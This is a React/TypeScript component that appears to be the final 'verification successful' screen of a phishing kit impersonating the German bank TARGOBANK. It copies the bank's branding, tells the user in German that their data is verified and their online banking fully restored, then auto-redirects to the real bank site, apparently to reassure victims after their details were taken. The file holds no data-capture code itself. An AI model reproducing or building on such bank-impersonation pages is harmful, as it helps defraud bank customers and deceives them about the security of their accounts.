import React, { useState, useEffect } from 'react';
import { CheckCircle } from 'lucide-react';

interface FinalSuccessScreenProps {
  message?: string;
  redirectUrl?: string;
  redirectDelay?: number;
}

const FinalSuccessScreen: React.FC<FinalSuccessScreenProps> = ({ 
  message = 'Ihre Daten wurden erfolgreich verifiziert.',
  redirectUrl = 'https://www.targobank.de',
  redirectDelay = 5000
}) => {
  const [countdown, setCountdown] = useState(Math.floor(redirectDelay / 1000));
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = redirectUrl;
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [redirectUrl]);

  return (
    <div style={{
      backgroundColor: '#f8f9fa',
      minHeight: '80vh',
      padding: isMobile ? '40px 20px' : '80px 40px',
      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      <div style={{
        maxWidth: '600px',
        margin: '0 auto',
        textAlign: 'center',
        backgroundColor: 'white',
        borderRadius: '12px',
        padding: isMobile ? '40px 24px' : '60px 48px',
        boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
      }}>
        {/* Success Icon */}
        <div style={{
          marginBottom: '32px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <div style={{
            width: '100px',
            height: '100px',
            borderRadius: '50%',
            backgroundColor: '#e8f5e9',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            animation: 'pulse 2s infinite'
          }}>
            <CheckCircle size={60} color="#4caf50" />
          </div>
        </div>

        {/* Success Title */}
        <h1 style={{
          color: '#003366',
          fontSize: isMobile ? '28px' : '36px',
          fontWeight: '900',
          margin: '0 0 16px 0',
          lineHeight: '1.2',
          fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
        }}>
          Verifizierung erfolgreich!
        </h1>

        {/* Success Message */}
        <p style={{
          color: '#666',
          fontSize: isMobile ? '16px' : '18px',
          lineHeight: '1.6',
          margin: '0 0 32px 0',
          fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
        }}>
          {message}
        </p>

        {/* Info Box */}
        <div style={{
          backgroundColor: '#e3f2fd',
          borderRadius: '8px',
          padding: '20px',
          marginBottom: '32px'
        }}>
          <p style={{
            color: '#003366',
            fontSize: isMobile ? '14px' : '16px',
            margin: '0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
            lineHeight: '1.6'
          }}>
            Ihr Konto ist jetzt vollständig verifiziert. Sie können alle Funktionen des Online-Bankings wieder uneingeschränkt nutzen.
          </p>
        </div>

        {/* Redirect Notice */}
        <div style={{
          marginBottom: '24px'
        }}>
          <p style={{
            color: '#666',
            fontSize: '14px',
            margin: '0 0 8px 0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Sie werden automatisch weitergeleitet in
          </p>
          <div style={{
            fontSize: '48px',
            fontWeight: 'bold',
            color: '#00b6ed',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            {countdown}
          </div>
          <p style={{
            color: '#666',
            fontSize: '14px',
            margin: '8px 0 0 0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Sekunden
          </p>
        </div>

        {/* Manual Redirect Button */}
        <button
          onClick={() => window.location.href = redirectUrl}
          style={{
            backgroundColor: '#c20831',
            color: 'white',
            border: 'none',
            borderRadius: '50px',
            padding: isMobile ? '14px 32px' : '16px 40px',
            fontSize: isMobile ? '16px' : '18px',
            fontWeight: 'bold',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
            cursor: 'pointer',
            transition: 'all 0.3s ease',
            boxShadow: '0 6px 20px rgba(194, 8, 49, 0.3)'
          }}
          onMouseOver={(e) => {
            e.currentTarget.style.backgroundColor = '#a91e2c';
            e.currentTarget.style.transform = 'translateY(-2px)';
          }}
          onMouseOut={(e) => {
            e.currentTarget.style.backgroundColor = '#c20831';
            e.currentTarget.style.transform = 'translateY(0)';
          }}
        >
          Jetzt weiter zur TARGOBANK
        </button>

        {/* TARGOBANK Logo */}
        <div style={{
          marginTop: '40px',
          paddingTop: '24px',
          borderTop: '1px solid #e0e0e0'
        }}>
          <img
            src="/images/targobank-logo.svg"
            alt="TARGOBANK"
            style={{
              height: '40px',
              width: 'auto',
              opacity: 0.8
            }}
          />
        </div>
      </div>

      <style>
        {`
          @keyframes pulse {
            0% {
              transform: scale(1);
              box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.4);
            }
            50% {
              transform: scale(1.05);
              box-shadow: 0 0 0 20px rgba(76, 175, 80, 0);
            }
            100% {
              transform: scale(1);
              box-shadow: 0 0 0 0 rgba(76, 175, 80, 0);
            }
          }
        `}
      </style>
    </div>
  );
};

export default FinalSuccessScreen;

